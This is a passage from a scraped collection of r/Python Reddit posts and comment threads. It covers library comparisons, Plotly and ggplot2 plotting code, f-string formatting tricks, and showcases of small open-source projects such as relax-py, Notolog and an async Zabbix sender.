    "post_content": "I was doing some light reading and stumbled across Steve Gribbles Power vs Speed Calculator and thought I'd give it a go at rebuilding it based on his Physics model using Python. Then I wrote an article about. Thought I'd share it with you all: Calculating Virtual Cycling Power (jasonlei.com)",
    "comments": [
        {
            "author": "cmdrmac",
            "score": "3",
            "content": "This is really neat! Great to see the math and the physics, especially as Python code."
        },
        {
            "author": "muneriver",
            "score": "3",
            "content": "This is super neat - I enjoyed the write-up and the clean code. I'm personally a huge cycling fan and a big python user. I built out this cycling ML model that was trained to predict my power output based on my historical riding data. Check it out if you're interested! https://github.com/jairus-m/StravaCyclingMLProject"
        }
    ]
},
{
    "post_author": "kostakos14",
    "post_id": "1cpj8ra",
    "post_score": "9",
    "post_time": "Saturday, May 11, 2024 at 5:53:05 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "APScheduler vs Schedule package",
    "media": [
        "https://pypi.org/project/APScheduler/",
        "https://schedule.readthedocs.io/"
    ],
    "post_content": "Hey folks, looking to use one library to implement some background scheduling logic on my application.\nI find in Google search APScheduler to be frequently mentioned, but I can see the Schedule package has more GH stars.\nWas curious if anybody has used one of them, and which one would you recommend based on your own experience.",
    "comments": [
        {
            "author": "amisat12",
            "score": "10",
            "content": "I would recommend apschedular. Battle tested in production ."
        },
        {
            "author": "VoyZan",
            "score": "4",
            "content": "Using either will likely leave you satisfied, they're both good - though it may depend on your specific needs. APS is a much more advanced tool, although also supporting relatively straightforward basic setup. Schedule is simpler and more limited, but also does what it says on the package and will likely cover the common needs. I use APS more often since it seems easier to set up and get the project going. As a side note - and a very personal subjective side note - I also don't think the maintenance of APS is adequate to it's popularity. I've been using it on and off for some 5 years now, and through that time I've seen features and bug fix suggestions rejected and marked for the next major update - which is still nowhere near release. The priorities frequently seem to be shifted elsewhere, while the current version gets hardly any meaningful development for many years now. I don't know if Schedule is any better in that sense though. Given that, as much as it's superb to have APS as a start, writing an in-house scheduler ended up being the safer way to go forward for certain projects in my case.",
            "replies": [
                {
                    "author": "kostakos14",
                    "score": "1",
                    "content": "Thanks for the reply! Will keep this in mind, curious why you ended up writing an in-house scheduler. You just did not want the boilerplate you have with APS or stumbled upon any limitations?"
                }
            ]
        },
        {
            "author": "greenstake",
            "score": "3",
            "content": "What are you trying to accomplish?"
        },
        {
            "author": "Forsaken_Ad8581",
            "score": "1",
            "content": "APScheduler. Using it for the company I work at, and it's doing a great job; easy to set up and reliable."
        }
    ]
},
{
    "post_author": "olive_oil_for_you",
    "post_id": "1cn01jc",
    "post_score": "119",
    "post_time": "Wednesday, May 8, 2024 at 12:04:13 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Why is Plotly so cumbersome to tweak?",
    "media": [
        "https://imgur.com/a/f4joWfl",
        "https://smalldev.tools/share-bin/KBzld6Wi"
    ],
    "post_content": "I made this visualisation with this code.\nI have three questions:\nIs Plotly supposed to be this cumbersome to tweak? Would other libraries require the same amount of code to add the details I did?\nCan my code be reduced in size? Maybe it's me who is complicating things with Plotly and there are easier ways to do what I am doing.\nAny R enthusiast who can tell me how much shorter this code would look like with ggplot2? I asked ChatGPT but the result was garbage.\nBonus question: This took me an entire morning. Is it normal to be \"that slow\" to plot a simple figure?",
    "comments": [
        {
            "author": "PapstJL4U",
            "score": "99",
            "content": "This took me an entire morning. Is it normal to be \"that slow\" to plot a simple figure? The first time i always hard. Most basic tutorials often fail at the first sign of reality, especially when you add graphics, usability and other usable output. Knowing which knobs to turn is the skill you learn.",
            "replies": [
                {
                    "author": "olive_oil_for_you",
                    "score": "14",
                    "content": "Thank you. It's not my first time, unfortunately haha. I've used plotly several times, and each time I end up with a cumbersome code that is not modular, simply because I think of new additions as I go and don't spend the time/have the capacity to remake it into a modular way. The use of shaded areas is new for me, tho, and it took me some time to get how it works."
                }
            ]
        },
        {
            "author": "Zer0designs",
            "score": "49",
            "content": "You have quite some reptition. I'm on mobile, but to make my point, some pseudocode: def add_line(plot, region, color, etc...): #add line to plot def add_area(plot, region, color, etc...): # Add sd area to plot def add_annotation(plot, region, color, etc...): # Add annotation def add_data_to_plot(plot, region, color, etc...): add_line(arguments) add_area(arguments) add_annotation(arguments) Plot = InitializePlot() For region in regions: add_data_to_plot() As for R: yeah its probably less code but trust me,continue to learn python. R is great for analytics (and some academic modelling). Python is better for almost everything else. In Ggplot or any other language the same suggestions I made above apply.",
            "replies": [
                {
                    "author": "venustrapsflies",
                    "score": "20",
                    "content": "In ggplot you don’t need to write your own functions to tweak your plots because the natural grammar is so powerful. I use plotnine in python wherever I can but it’s not a complete recreation.",
                    "replies": [
                        {
                            "author": "olive_oil_for_you",
                            "score": "3",
                            "content": "Yes, I saw plotnine being mentioned in another thread. I had my suspicions that it wouldn't mimic ggplot2 perfectly and wondered whether it would add any benefits to replace plotly with it.",
                            "replies": [
                                {
                                    "author": "venustrapsflies",
                                    "score": "4",
                                    "content": "Tough to tell, it's not an automatic \"yes\" but you might try it out. If you're used to relying on ggplot extensions, it may not be enough for you. It also won't be able to do anything dynamic or interactive. But for EDA and churning out plots for analysis, it's still great (like ggplot)."
                                }
                            ]
                        },
                        {
                            "author": "Zer0designs",
                            "score": "0",
                            "content": "Yeah I get that, but still the idea of DRY is applicable to most languages. In R I mostly use highcharter, which is also similar to the Ggplot syntax. Ggplot also comes with Python"
                        }
                    ]
                },
                {
                    "author": "olive_oil_for_you",
                    "score": "4",
                    "content": "Thank you. I'll try to implement these suggestions, I get the point now."
                }
            ]
        },
        {
            "author": "datavizisfun",
            "score": "22",
            "content": "IMO ggplot is substantially better than anything python has to offer (for static charts). The way of expressing the mapping between data and aesthetics enables succinct descriptions of all sorts of vizualisations. That being said, charting is always an 80-20 exercise, where very little time might be spent to get something useful but then the final tweaks and labelling takes a lot longer. For your comparison I've (nearly) recreated your chart using ggplot. I first reshaped the SSP data into a data frame with the relevant columns: Region, Year, Pop_SSP1, Pop_SSP2, Pop_SSP3: df_chart <- df %>% pivot_longer( -c(\"Model\":\"Unit\"), names_to = \"Year\", values_to = \"Population\", names_transform = as.integer ) %>% pivot_wider(names_from = Scenario, values_from = Population, names_prefix = \"Pop_\") Getting a quick chart is easy: ggplot(df_chart, aes(x = Year)) + geom_ribbon(aes(ymin = Pop_SSP1, ymax = Pop_SSP3, fill = Region), alpha = 0.5) + geom_line(aes(y = Pop_SSP2, col = Region)) Adding the labels and formatting requires a few more lines (but is still but simpler and easier than in plotly (IMO)): region_colors <- c( \"Ghana\" = rgb(201, 53, 26, maxColorValue = 255), \"Zimbabwe\" = rgb(197, 90, 28, maxColorValue = 255), \"Kenya\" = rgb(202, 163, 40, maxColorValue = 255) ) transition_year <- 2040 label_year <- 2050 max_pop <- max(df_chart$Pop_SSP3) ggplot(df_chart, aes(x = Year, y = Pop_SSP2)) + geom_ribbon(aes(ymin = Pop_SSP1, ymax = Pop_SSP3, fill = Region), alpha = 0.5) + geom_line(aes(col = Region)) + geom_vline(aes(xintercept = transition_year), linetype = \"dashed\") + geom_text(data = . %>% filter(Year == max(Year)), aes(label = sprintf(\"%0.2fM\", Pop_SSP2)), hjust = 0) + geom_text(data = . %>% filter(Year == label_year), aes(label = Region, y = Pop_SSP1), hjust = 0, vjust = 1) + annotate(\"text\", x = transition_year, y = max_pop, label = \"Estimation\", hjust = 1.1) + annotate(\"text\", x = transition_year, y = max_pop, label = \"Projection\", hjust = -0.1) + scale_x_continuous(expand = expansion(add = c(NA, 10))) + scale_y_continuous(labels = function(x) sprintf(\"%dM\", x)) + scale_color_manual(values = region_colors, aesthetics = c(\"color\", \"fill\")) + theme_minimal() + theme(panel.grid = element_blank(), axis.title = element_blank(), legend.position = \"none\") + labs( title = \"Population in the three case study countries\", subtitle = \"Based on SSP 2024 release. Thick lines represent SSP2, lower and upper bounds correspond to SSP1 and SSP3.\" )",
            "replies": [
                {
                    "author": "olive_oil_for_you",
                    "score": "5",
                    "content": "I love reddit. Thanks for this."
                }
            ]
        },
        {
            "author": "olooopo",
            "score": "6",
            "content": "You have the wrong approach to plotly. Thats all! First, only use the plotly.go if you really need to. Continous error bands that you have are actually one of the few examples I use plotly.go . Second, I recommend you to use plotly.express. If you need error bands wrap plotly.go functionality with the figure.data object of plotly express. It is done here: https://stackoverflow.com/questions/69587547/continuous-error-band-with-plotly-express-in-python Using plotly express makes your code more modular since you separate the code for visualization and the data. It is also much faster to develope and cleaner ro read. A plot like you have done would take me maybe 5 minutes."
        },
        {
            "author": "ivosaurus",
            "score": "4",
            "content": "Is it normal to be \"that slow\" to plot a simple figure? Depends if you've already worked with the library many times in the last few months, or if this was basically the first time and every second line of code you were going back to the reference docs to know how to adjust things. I've probably fucked at least one thing up in this code, but you can see you have lots of repeated but slightly different scatter calls. Those can be reduced with some functions and arguments. for i, region in enumerate(regions): regionData = sspPop[sspPop[\"Region\"] == region] colorLine = colorLines[i] colorArea = colorAreas[i] def custom_scatter(data, scenario, line_width, fill_type=None): args = dict( x=data[data[\"Scenario\"] == scenario][\"Year\"], y=data[data[\"Scenario\"] == scenario][\"Population\"], mode=\"lines\", name=region, line=dict(color=colorLine, width=line_width), legendgroup=region, showlegend=False, ) if fill_type is not None: args.update(fill_type) fig.add_trace(go.Scatter(**args)) scenario_config = { \"Historical Reference\": {\"line_width\": 1}, \"SSP1\": {\"line_width\": 0}, \"SSP2\": {\"line_width\": 1}, \"SSP3\": {\"line_width\": 0, \"fill_type\": {\"fill\": \"tonexty\", \"fillcolor\": colorArea}}, } for scenario in regionData[\"Scenario\"].unique(): args = scenario_config[scenario] custom_scatter(regionData, scenario, **args)"
        },
        {
            "author": "adm7373",
            "score": "4",
            "content": "This doesn't seem like that much code to produce a highly customized graphic like that. If you're producing a lot of similar graphics with the same customizations, you could definitely put a lot of the boilerplate into a shared function/definition. But I don't think there's much fat to trim for just a single graphic."
        }
    ]
},
{
    "post_author": "MindLopsided4430",
    "post_id": "1clrnce",
    "post_score": "32",
    "post_time": "Monday, May 6, 2024 at 10:24:03 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "relax-py - Web framework for htmx with hot module replacement",
    "media": [
        "https://github.com/a-h/templ",
        "https://github.com/keithasaurus/simple_html",
        "http://github.com/crpier/relax-py",
        "https://www.hotrails.dev/",
        "http://crpier.github.io/relax-py",
        "https://www.starlette.io/",
        "https://github.com/dcastil/tailwind-merge"
    ],
    "post_content": "Excited to finally showcase this!\nIt's still pretty rough around the edges, but I'm finally happy enough with the feature set and curious to see what the community thinks about a framework like this.\nCode: github.com/crpier/relax-py\nDocumentation: crpier.github.io/relax-py\nWhat My Project Does\nrelax-py is a Python framework for building full-stack applications with htmx\nIt provides tools for writing HTML in a manner similar to simple_html (which also inspired the decision to use standard Python to write HTML, rather than use Jinja2 or to make something like templ work in Python)\nIt has:\nHot Module Replacement (meaning, when you update the code that generates HTML templates, the browser also updates instantly) - see the video in the documentation for a quick demo of this\nURL resolution with type hinting - you can get the URL of an endpoint to use in your templates by using the function that handles that URL, and get help from static typing (for example, for putting path parameters in the URL)\nHelpers for dependency injection\nIn essence, this framework is just a bunch of decorators and functions over starlette, meaning everything that starlette has can be used alongside the framework.\nTarget Audience\nDevelopers interested in building web applications with htmx that like new shiny things and static typing support\nComparison\nAs far as I know, the only other backend framework that has Hot Module Replacement is turbo in Ruby on Rails, but there might be something I missed.\nAs for other points of comparison with other frameworks:\nDjango\nrelax is less opinionated about what's done in the backend (.e.g there is preference to what ORM is used)\nusing standard Python code to generate HTML has nicer static typing\nthe URL resolution is more complex and provides errors in the IDE by way of static typing\nthe component decorator provides nicer ways to reuse template functions and helpers for interoperability with JavaScript\ntempl in Go\ntempl allows writing actual HTML in go files, but requires an additional compilation step\nplugins for whatever IDE/code editor is used are needed parsing templ files\nFastAPI (with something to generate HTML like simple_html or Jinja2)\nsince FastAPI is built for RESTful APIs, it lacks niceties like URL resolution, or a mechanism to manage the sprawling mess of interconnected HTML components that apps tend to develop\ndependency injection in FastAPI is \"encouraged\" to happen in the path functions, but in relax it's meant to happen at any level of the app (either in path functions, or in service-level functions, or in util functions)\nsimple_html (with a backend like Flask or FastAPI): the main differences between simple_html and the relax.html module are that\nCSS classes are provided as a list of strings - this makes it easier to reuse them in different components, and will make it easier to implement other helpers in the future, like a Python version of tailwind-merge, or a formatter that sorts tailwind classes\nhtmx-related attributes are included in the elements\ninserting children to an HTML element is done after instantiating the element, making it easier to reuse components\nHere's the code again: github.com/crpier/relax-py\nThere's more details in the documentation: crpier.github.io/relax-py\nWhile this framework is definitely not production ready, in the \"Other\" page of the documentation there's an example app built with this framework, which shows how it can be used in conjuction with some real-life scenarios (production environment for tailwind with plugins, working in a bunch of interactivity with JavaScript, in either separate js files and inline scripts, Dockerfiles and deployments, authentication and authorization, configuration etc.)\nPlease let me know what you think (are there better alternatives, is writing HTML in standard Python a deal-breaker, is investing in making something templ in Python worth it?)\nHope you're intrigued by this!",
    "comments": [
        {
            "author": "SalMolhado",
            "score": "1",
            "content": "is it possible to have one of those swagger out of the box screens? but this time the focus would be on the returned html snippet and perhaps query parameters, path variables and headers. That would be a great start to making htmx based apps more decoupled without extra code. What you think?",
            "replies": [
                {
                    "author": "MindLopsided4430",
                    "score": "2",
                    "content": "It's certainly possible to implement, but I'm not sure in which context it would be most impactful. My thinking is that for RESTful APIs you want this decoupling because people building the API and people consuming the API are on different functions, different teams, or even different companies. But for a full-stack app built with htmx, you'd have the same person (or the same team) building an endpoint and the HTML template that uses the endpoint, so decoupling wouldn't help so much. For query parameters and path parameters, the URL locators can give you hints in the IDE on having the correct values, but I didn't think about headers until now. Maybe you could have an endpoint that could respond with either HTML or something else based on the \"Accept\" header, and you'd like to document possible values? Do you have any examples/ideas for ways to use headers like this?"
                }
            ]
        },
        {
            "author": "Old_Transition_3884",
            "score": "0",
            "content": "Video link not working"
        },
        {
            "author": "techmindmaster",
            "score": "0",
            "content": "How does this project compare to Litestar? https://docs.litestar.dev/2/usage/htmx.html"
        },
        {
            "author": "bsenftner",
            "score": "2",
            "content": "Looks like a hell of a lot of work on your behalf, <standing, clapping>. I hope to carve out the time to check this out, I've got a large FastAPI application that illustrates the need for some of your mentioned pain points.",
            "replies": [
                {
                    "author": "MindLopsided4430",
                    "score": "0",
                    "content": "Thanks! Most of the time was spent playing with various designs until settling on this one I haven't considered integrating with other frameworks so far, but you've given me food for thought. FastAPI would be a good contender since it's also based on Starlette",
                    "replies": [
                        {
                            "author": "bsenftner",
                            "score": "1",
                            "content": "Are you working on your own?",
                            "replies": [
                                {
                                    "author": "MindLopsided4430",
                                    "score": "2",
                                    "content": "Yep"
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "robertpro01",
            "score": "1",
            "content": "Great work! I wish I had a brain to build something like you did!"
        },
        {
            "author": "builderjer",
            "score": "1",
            "content": "I don't see a license"
        }
    ]
},
{
    "post_author": "devotaku",
    "post_id": "1cpidy2",
    "post_score": "5",
    "post_time": "Saturday, May 11, 2024 at 5:11:49 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Introducing Notolog: Python Markdown Editor built with PySide6",
    "media": [
        "https://github.com/notolog/notolog-editor",
        "https://pypi.org/project/notolog/"
    ],
    "post_content": "Excited to share my personal open-source project: Notolog - Python Markdown Editor (MIT License).\nThe main motivation for developing another markdown editor was my passion for learning new things and enhancing my development skills in Python. I developed it in my spare time over a few months, despite having no prior experience in creating full-scale Python applications.\nWhat My Project Does\n∗ Multiplatform\n∗ Markdown async syntax highlighting created by me\n∗ Several pre-installed color themes\n∗ Supports English and 17 other languages right out of the box\n∗ Integration with OpenAI API for AI-assisted features\n∗ Optional file encryption/decryption\nTarget Audience\nPrimarily developers who write markdown documents and notes.\nComparison\nThis is more of a personal learning project, so it's hard to compare it directly with others.\nHow to install\nDiscover Notolog on GitHub 🌟 and PyPI.\nInstallation is as easy as running a single command:\npip install notolog",
    "comments": [
        {
            "author": "poa00",
            "score": "2",
            "content": "This looks really cool! I don't know of too many markdown editors that operate on the Python MD library. Any plans to support Pymdown extensions? I found your app looking for an editor that supports SuperFences, a feature I have rarely seen in MD based documentation. Either way I'm definitely planning to check it out!",
            "replies": [
                {
                    "author": "devotaku",
                    "score": "1",
                    "content": "Thanks for the feedback! I'm currently focused on integrating on-device AI and local LLM support. After that I plan to add more functionality especially with Markdown-related features. Really appreciate your interest!"
                }
            ]
        }
    ]
},
{
    "post_author": "deepkrg17",
    "post_id": "17hgu5o",
    "post_score": "2006",
    "post_time": "Friday, October 27, 2023 at 8:58:28 AM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "You should know these f-string tricks",
    "media": [
        "https://www.reddit.com/r/Python/s/Tzx7QQwa7A",
        "https://docs.python.org/3/library/datetime.html#strftime-and-strptime-format-codes"
    ],
    "post_content": "F-strings are faster than the other string formatting methods and are easier to read and use. Here are some tricks you may not have known.\n1. Number formatting :\nYou can do various formatting with numbers.\n>>> number = 150\n\n>>> # decimal places to n -> .nf\n>>> print(f\"number: {number:.2f}\")\nnumber: 150.00\n\n>>> # hex conversion\n>>> print(f\"hex: {number:#0x}\")\nhex: 0x96\n\n>>> # binary conversion\n>>> print(f\"binary: {number:b}\")\nbinary: 10010110\n\n>>> # octal conversion\n>>> print(f\"octal: {number:o}\")\noctal: 226\n\n>>> # scientific notation\n>>> print(f\"scientific: {number:e}\")\nscientific: 1.500000e+02\n\n>>> # total number of characters\n>>> print(f\"Number: {number:09}\")\nNumber: 000000150\n\n>>> ratio = 1 / 2\n>>> # percentage with 2 decimal places\n>>> print(f\"percentage = {ratio:.2%}\")\npercentage = 50.00%\n2. Stop writing print(f”var = {var}”)\nThis is the debug feature with f-strings. This is known as self-documenting expression released in Python 3.8 .\n>>> a, b = 5, 15\n>>> print(f\"a = {a}\") # Doing this ?\na = 5\n>>> # Do this instead.\n>>> print(f\"{a = }\")\na = 5\n>>> # Arithmatic operations\n>>> print(f\"{a + b = }\")\na + b = 20\n>>> # with formatting\n>>> print(f\"{a + b = :.2f}\")\na + b = 20.00\n3. Date formatting\nYou can do strftime() formattings from f-string.\n>>> import datetime\n\n>>> today = datetime.datetime.now()\n>>> print(f\"datetime : {today}\")\ndatetime : 2023-10-27 11:05:40.282314\n\n>>> print(f\"date time: {today:%m/%d/%Y %H:%M:%S}\")\ndate time: 10/27/2023 11:05:40\n\n>>> print(f\"date: {today:%m/%d/%Y}\")\ndate: 10/27/2023\n\n>>> print(f\"time: {today:%H:%M:%S %p}\")\ntime: 11:05:40 AM\nCheck more formatting options.\nPart 2 - https://www.reddit.com/r/Python/s/Tzx7QQwa7A\nThank you for reading!\nComment down other tricks you know.",
    "comments": [
        {
            "author": "fizzymagic",
            "score": "563",
            "content": "print(f\"number: {number:,}\") puts commas in large numbers.",
            "replies": [
                {
                    "author": "deepkrg17",
                    "score": "55",
                    "content": "Yeah, forgot to mention this one."
                },
                {
                    "author": "ArtOfWarfare",
                    "score": "58",
                    "content": "FYI, you probably should have done print(f”{number=:,}”)"
                },
                {
                    "author": "nderstand2grow",
                    "score": "31",
                    "content": "better yet: print(f\"{number = :,}\")"
                },
                {
                    "author": "Ran4",
                    "score": "19",
                    "content": "Such a shame that {number: } doesn't work :(",
                    "replies": [
                        {
                            "author": "RollingWithDaPunches",
                            "score": "8",
                            "content": "FYI, you probably should have done print(f”{number=:,}”) as commented by someone else."
                        },
                        {
                            "author": "int0h",
                            "score": "8",
                            "content": "Underscore is an alternative to comma for those of us that uses commas the decimal separator."
                        }
                    ]
                },
                {
                    "author": "-Rizhiy-",
                    "score": "3",
                    "content": "I prefer underscore"
                },
                {
                    "author": "sohang-3112",
                    "score": "4",
                    "content": "TIL"
                }
            ]
        },
        {
            "author": "lastmonty",
            "score": "308",
            "content": "Thanks for the post and thanks for not making it behind a link that we need to scroll through your life journey and your neighbours cat."
        },
        {
            "author": "astatine",
            "score": "75",
            "content": "You can interpolate into the formatting to alter it: >>> from math import pi >>> for n in range(1, 10): ...     print(f\"π to {n} places is {pi:.{n}f}\") ... π to 1 places is 3.1 π to 2 places is 3.14 π to 3 places is 3.142 π to 4 places is 3.1416 π to 5 places is 3.14159 π to 6 places is 3.141593 π to 7 places is 3.1415927 π to 8 places is 3.14159265 π to 9 places is 3.141592654"
        },
        {
            "author": "wineblood",
            "score": "24",
            "content": "I didn't know about the date formatting one. Not sure I'll ever use it, but nice to have."
        },
        {
            "author": "zurtex",
            "score": "21",
            "content": "Missing the two \"tricks\" I use most often, f\"{foo!s}\" which calls str on foo, and f\"{foo!r}\" which calls repr on foo. Especially when building Airflow template macros I find myself needing to explicitly create strings or reprs and not leaving it up to the f-string/object default logic."
        },
        {
            "author": "bugtank",
            "score": "57",
            "content": "Trick 2 is insane. Implicit variable extrapolation? Hot dog!"
        },
        {
            "author": "The56thBenjie",
            "score": "10",
            "content": "Hex without \"0x\" is {number:x} \"0b\" and \"0o\" can also be added to binary and octal using :#b and :#o Also: the 0 in :#0x seems to have a different purpose, and is not required for printing hex with \"0x\"."
        }
    ]
},
{
    "post_author": "Financial_Muffin396",
    "post_id": "1cnhzmy",
    "post_score": "6",
    "post_time": "Thursday, May 9, 2024 at 1:53:59 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "I connected LLM to Python runtime and generated unit-tests (OpenSource)",
    "media": [
        "https://blog.janestreet.com/the-joy-of-expect-tests/",
        "https://arxiv.org/pdf/2402.06111",
        "https://github.com/CaptureFlow/captureflow-py",
        "https://github.com/CaptureFlow/captureflow-py/pull/62"
    ],
    "post_content": "Hi all, I initially started this adventure by trying to automate bug fixes with the help of LLMs. However, I received feedback saying the fixes aren't always correct, leading to the question: why bother reviewing PRs that might add more issues? (It's really hard for LLMs to say \"I don't know\").\nSo, I decided to focus on reliability perfecting unit tests.\nThe source code is available at: https://github.com/CaptureFlow/captureflow-py\nWhat My Project Does:\nIt incorporates a tracer client-side Python library and a backend that accumulates such traces and is capable of proposing code improvements and generating tests for your repository. It traverses the execution graph, extracts relevant parts, enriches them with implementation data from the GitHub API, and then generates tests with the help of GPT4.\nTarget Audience:\nPython users interested in discovering what LLMs can achieve when given detailed runtime information from your app. Generally, this approach somewhat reverses the concept of TDD, but in my day job I deal with many legacy apps that have poor test coverage, and having it really helps. I suspect I’m not alone in finding value in this.\nComparison:\nI think idea of using LLMs to generate tests is not new, but generating them actually based on application's performance is inspired by Jane Street's article on how they automated test boilerplate creation and recent Facebook's research paper.\nDisclaimer: More work needs to be done to make it work for any Python app and not just a subset of FastAPI servers. I'm curious if you folks would find it useful.\nExample: you can check this PR for reference. feedback / stars / contributions are welcome.",
    "comments": [
        {
            "author": "amarao_san",
            "score": "8",
            "content": "\"Patch the methods with mock data\": The most unhelpful comment you can get in the code. I know what patch does, I don't need comment on it. How about explaining what is in the patching? What behavior do you replicate? Where data fro mocking are coming from? Half-year later, I do refactoring, getting this test red. Why? What had I broke? What this test is testing and why do you insist it is a correct test? Oh, sorry, it was written by AI. May be I broke someone hallucination."
        },
        {
            "author": "DuckDatum",
            "score": "2",
            "content": "icky advise threatening alive crowd coherent cake file roof glorious This post was mass deleted and anonymized with Redact",
            "replies": [
                {
                    "author": "Financial_Muffin396",
                    "score": "1",
                    "content": "PMed :)"
                }
            ]
        },
        {
            "author": "BlueeWaater",
            "score": "1",
            "content": "Sounds like an interesting project"
        },
        {
            "author": "TheRealNetroxen",
            "score": "0",
            "content": "This is actually awesome, and there not being many comments just goes to show why people need more tests in their apps. I'm gonna check this out! Thanks :)"
        }
    ]
},
{
    "post_author": "cjbj",
    "post_id": "1cm3j4q",
    "post_score": "3",
    "post_time": "Tuesday, May 7, 2024 at 7:37:59 AM GMT+3",
    "flair_text": "News",
    "post_title": "python-oracledb 2.2 and the VECTOR type in Oracle Database 23ai",
    "media": [
        "https://github.com/oracle/python-oracledb/issues/332"
    ],
    "post_content": "python-oracledb 2.2, the Oracle Database driver, has been released with support for Oracle Database 23ai features such as the VECTOR and BOOLEAN data types, Implicit Connection Pooling, and improved connection performance. See the release announcement.",
    "comments": []
},
{
    "post_author": "Royal_Section4889",
    "post_id": "1cpw67l",
    "post_score": "0",
    "post_time": "Sunday, May 12, 2024 at 4:10:14 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "I've developed a library for send metrics to zabbix asynchronously ",
    "media": [
        "https://github.com/adubkov/py-zabbix",
        "https://github.com/gustavofbreunig/zabbix-sender-async"
    ],
    "post_content": "I have been using zabbix for monitoring a lot of metrics in my work, none of the most popular zabbix were capable of doing async tasks, so I've developed some simple package capable of doing this.\nTests, examples and how-tos can be found here: https://github.com/gustavofbreunig/zabbix-sender-async\nWhat My Project Does\nSend zabbix sender messages using asyncio tasks.\nTarget Audience\nSysAdmins who use Zabbix to monitor a large number of metrics.\nComparison\nInstead of doing traditional way, using these abandoned library: https://github.com/adubkov/py-zabbix\nfrom pyzabbix import ZabbixMetric, ZabbixSender\n\n# Send metrics to zabbix trapper\npacket = [\n  ZabbixMetric('hostname1', 'test[cpu_usage]', 2),\n  ZabbixMetric('hostname1', 'test[system_status]', \"OK\"),\n  ZabbixMetric('hostname1', 'test[disk_io]', '0.1'),\n  ZabbixMetric('hostname1', 'test[cpu_usage]', 20, 1411598020),\n]\n\nresult = ZabbixSender(use_config=True).send(packet)\nYou can do this:\nasync def sendmetrics():\n    sender = AsyncSender('localhost', 10051)\n    metric = ItemData(host='hostname', key='test.metric.text', value='test package import')\n    result = await sender.send(metric)",
    "comments": [
        {
            "author": "arjjov",
            "score": "2",
            "content": "Send is coupled with opening the connection, if you try to send many metrics this won't scale. Also there's no exc/err being handled. To use as a script run once type of thing it can be useful, but as a general client it needs to be improved.",
            "replies": [
                {
                    "author": "Royal_Section4889",
                    "score": "1",
                    "content": "The send is coupled with connection, but you can send an array of metrics, so it opens the connection only once: sender = AsyncSender('localhost', 10051) metrics = [] metrics.append(ItemData('async-sender-test-host', 'test.metric.unsigned', 1234)) metrics.append(ItemData('async-sender-test-host', 'test.metric.float', math.pi)) response = await sender.send(metrics) And about the exception handling, Zabbix responses are too poor on information to do some decent exception handling, but I'm working on this. Thanks for the feedback."
                }
            ]
        },
        {
            "author": "vmpajares",
            "score": "1",
            "content": "I assume that sending them with async in an array you can send multiple metrics in a single call. So you can send more metrics or more often with the same hardware. But, if your server is busy, doesn't the server launch the triggers for not getting the data when it expects them?",
            "replies": [
                {
                    "author": "Royal_Section4889",
                    "score": "1",
                    "content": "I assume that sending them with async in an array you can send multiple metrics in a single call. So you can send more metrics or more often with the same hardware. Correct But, if your server is busy, doesn't the server launch the triggers for not getting the data when it expects them? In a busy server, async calls is even better because the python script can collect metrics and send at same time without using multi threads and the synchronization/mutexes problem. But yes, if the server cannot process messages fast enough, it fires triggers, but these problems we solved using proxies to distribute effort."
                }
            ]
        }
    ]
},
{
    "post_author": "MisterBlggs",
    "post_id": "ci1cg4",
    "post_score": "1995",
    "post_time": "Friday, July 26, 2019 at 1:50:24 PM GMT+3",
    "flair_text": "",
    "post_title": "Double Pendulum made with Processing.py",
    "media": [
        "https://gfycat.com/feistycompetentgarpike"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "MisterBlggs",
            "score": "100",
            "content": "I noticed Processing had an interface for Python: Processing.py. So, I figured I would try to port Daniel Shiffman from the Coding Trains Double Pendulum Code over to Python and it was ridiculously easy. I'm surprised I hadn't heard of the Python version of Processing so I figured I would share with Reddit. Python code here"
        },
        {
            "author": "piotrulu",
            "score": "75",
            "content": "Or as I like to call it: flower petals generator. Good job my man."
        },
        {
            "author": "JackdeAlltrades",
            "score": "27",
            "content": "r/gifsthatendtoosoon"
        },
        {
            "author": "pa7x1",
            "score": "15",
            "content": "Very cool! If you are interested you could do some simulations to measure the Lyapunov exponent that demonstrate the chaotic behavior of the double pendulum. Select a starting point and fix a simulation time (the longer the better but keep it manageable for your computation). Simulate the double pendulum and record its position at time t. Then rinse and repeat with slight changes of the initial conditions. You should observe that very small changes of the initial conditions result in very different positions at time t."
        },
        {
            "author": "bluemerilin",
            "score": "10",
            "content": "That’s pretty cool. It looks like it’s a cross section of it drawing in 3D"
        },
        {
            "author": "ThortheAssGuardian",
            "score": "9",
            "content": "Very cool. Makes me wonder if you could model such a pendulum in 3D and use the line tracing as a model for a crazy looking 3D printed fruit bowl."
        },
        {
            "author": "[deleted]",
            "score": "4",
            "content": "r/oddlysatisfying"
        },
        {
            "author": "porcelain_robots",
            "score": "4",
            "content": "Can you ELI5 how the bottom part can swing higher than its orginial release point? What's the physics behind this?"
        },
        {
            "author": "[deleted]",
            "score": "3",
            "content": "Huge fan of processing.org. I used it in college in my art degree over a decade ago. Super excited to play with this, thanks for sharing!"
        },
        {
            "author": "poditoo",
            "score": "3",
            "content": "I am the only one who gets too excited when the second pendulum makes a full loop? It's like watching soccer, you see the angle of attack is right, the speed seems ok and it's getting close and SCOOOOOOOOOOORE. Edit oh and none of the players are overpaid."
        }
    ]
},
{
    "post_author": "Traditional_Yogurt",
    "post_id": "lcexoa",
    "post_score": "2242",
    "post_time": "Thursday, February 4, 2021 at 3:49:24 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "I made a Finance Database with over 180.000 tickers to make Investment Decisions easier",
    "media": [
        "https://github.com/JerBouma/FinanceDatabase",
        "https://github.com/JerBouma/FundamentalAnalysis",
        "https://github.com/sec-edgar/sec-edgar",
        "https://github.com/ranaroussi/yfinance",
        "https://github.com/JerBouma/FinanceDatabase#Examples",
        "https://github.com/JerBouma/FinanceDatabase/tree/master/Database"
    ],
